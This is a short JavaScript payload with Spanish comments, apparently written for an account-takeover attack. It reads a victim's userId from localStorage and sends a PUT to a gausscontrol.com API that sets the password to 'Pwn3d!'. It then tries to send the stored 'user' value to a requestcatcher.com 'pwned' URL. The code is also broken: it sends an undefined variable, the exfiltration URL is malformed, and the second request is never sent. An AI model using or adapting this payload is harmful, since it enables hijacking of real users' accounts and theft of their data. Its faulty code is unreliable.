const userId = localStorage.getItem('userId');

// Crear el objeto XMLHttpRequest
var xhr = new XMLHttpRequest();

// Configurar la solicitud PUT
xhr.open('PUT', 'https://w3.gausscontrol.com/api/accountuserPass/'+userId, true);
xhr.setRequestHeader('Content-Type', 'application/json');

// Definir los datos que se van a enviar en la solicitud
const data = {
    newPassword: "Pwn3d!",
    confirmedNewPassword: "Pwn3d!"
};

// Enviar la petición con los datos JSON
xhr.send(jsonData);

const user = localStorage.getItem('user');

xhr.open('GET', 'https://x.https://x.requestcatcher.com/pwned?user='+user, true);

// Confirmar por consola el ataque
console.log("Account Takeover done!");
